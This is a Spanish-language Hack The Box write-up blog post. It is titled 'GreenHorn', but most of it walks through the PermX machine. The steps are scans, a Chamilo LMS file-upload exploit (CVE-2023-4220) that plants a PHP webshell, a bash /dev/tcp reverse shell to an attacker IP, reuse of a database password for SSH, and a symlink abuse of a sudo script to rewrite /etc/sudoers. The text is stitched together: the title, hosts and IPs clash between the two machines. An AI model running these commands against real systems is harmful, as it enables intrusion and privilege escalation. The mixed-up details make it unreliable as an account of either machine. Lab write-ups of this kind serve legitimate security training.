---
title: GreenHorn - Hack The Box
date: 2024-10-06
description: Maquina GreenHorn (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/greenhorn/
image: greenhorn.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.23 -oG allPorts
```

Puertos abiertos: 22,80,3000,4446,8000

## Análisis

```bash
nmap -sCV -p22,80,3000,4446,8000 10.10.11.25 -oN targeted

22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
4446/tcp open  n1-fwp?
8000/tcp open  http-alt?
```

El puerto 80 da acceso a la web de http://greenhorn.htb, sin nada destacable.

Whatweb tampoco añade mayor información:
```bash
whatweb http://greenhorn.htb

http://greenhorn.htb [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.25], RedirectLocation[http://greenhorn.htb/?file=welcome-to-greenhorn], nginx[1.18.0]
http://greenhorn.htb/?file=welcome-to-greenhorn [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.25], MetaGenerator[pluck 4.7.18], Pluck-CMS[4.7.18], Title[Welcome to GreenHorn ! - GreenHorn], nginx[1.18.0]
```

Enumerando con nmap se ven los siguientes directorios sin información relevante:
```bash
nmap --script http-enum -p80 10.10.11.25 -oN webScan
80/tcp open  http
| http-enum: 
|   /admin.php: Possible admin folder
|   /login.php: Possible admin folder
|   /robots.txt: Robots file
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\log\dbpwdChange.log: Possible CiscoWorks (CuOM 8.0 and 8.5) Directory traversal (CVE-2011-0966) (Windows)
|   /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config: Cute Editor ASP.NET Remote File Disclosure ( CVE 2009-4665 )
|   /docs/README: Interesting, a readme.
|_  /data/: Potentially interesting folder
```

Enumerando subdominios con wfuzz se ven los siguientes subdominios, del cual se destaca lms:
```bash
wfuzz -c --hl=9 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" http://permx.htb/

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        586 L    2466 W     36182 Ch    "www"
000000477:   200        352 L    940 W      19347 Ch    "lms" 
```

## Explotación

http://lms.permx.htb es un LMS (Learning Management System) en Chamilo. Este LMS es vulnerable al [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) cuyo exploit está disponible en [GitHub](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS).

Este exploit se basa en subir una WebShell `'<?php echo system($_GET["cmd"])?>'` al directorio vulnerable `http://permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'` para a continuación establecer una Reverse Shell haciendo uso de la WebShell alojada en el directorio `http://permx.htb/main/inc/lib/javascript/bigupload/files/` pasando por GET la Reverse Shell `'#!/bin/bash\nbash -i >& /dev/tcp/{host}/{port} 0>&1'`

De forma manual, sin usar Exploit, es posible explotar la vulnerabilidad creando un fichero para la WebShell en php:
```bash
echo '<?php echo system($_GET["cmd"]); ?>' > webshell_test.php
```

Subiendola al directorio vulnerable del LMS:
```bash
curl -F "bigUploadFile=@webshell_test.php;filename=webshell_test.php" http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
The file has successfully been uploaded. 
```

Y estableciendo la Reverse Shell a través de la WebShell:
```bash
bash -c "bash -i >& /dev/tcp/10.10.15.23/443 0>&1"
```

Que, al hacer URL encode queda de la siguiente manera:
```http
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell_test.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.15.23/443 0>%261"
```

Y se gana acceso al sistema como usuario www-data:
```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ whoami
<ilo/main/inc/lib/javascript/bigupload/files$ whoami                     
www-data
```

## Escalada

### User

Listando los ficheros con permisos de root:

```bash
find / -perm -4000 -user root 2>/dev/null

/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nada destacable.

Listando los ficheros con configuración en el directorio de Chamilo se puede ver un configuration.php:

```bash
find . -name \*conf\* 2>/dev/null

...
./app/config/configuration.php
...
```

Este fichero contiene los datos de conexión de la bbdd:
```bash
www-data@permx:/var/www/chamilo$ cat ./app/config/configuration.php | grep db_user
$_configuration['db_user'] = 'chamilo';
www-data@permx:/var/www/chamilo$ cat ./app/config/configuration.php | grep db_password
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

Listando los usuarios de /home/ se puede ver el usuario "mtz" no accesible desde www-data.

Verificando la reutilización de la contraseña de la bbdd por el usuario mtz, se comprueba que es accesible por ssh.

>Username: mtz   
>Password: 03F6lY3uXAP2bkW8   

Al conectarse se obtiene la User Flag.
```bash
ssh mtz@10.10.11.23
```

### Root

Listando los ficheros en los que el usuario mtz tiene permisos se obtiene el script "/opt/acl.sh":
```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Este script usa "setfacl" para cambiar los permisos de cualquier fichero en /home/mtz:
```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

El script no permite hacer Path Traversal ya que refleja la opción `"$target" == *..* ` pero no controla los enlaces simbólicos.

Creando un enlace simbólico del fichero /etc/sudoers en /home/mtz:
```bash
ln -s /etc/sudoers /home/mtz/test
```

Y aplicando el script sobre el enlace simbolico se dan permisos de lectura y escritura sobre /etc/sudoers:
```bash
sudo /opt/acl.sh mtz rw /home/mtz/test
```

Lo que permite añadir el permiso de sudo al usuario mtz y convertirse en root:
```bash
vim /home/mtz/test
...
mtz     ALL=(ALL) ALL
...
```

Como root se tiene acceso a la Root Flag.
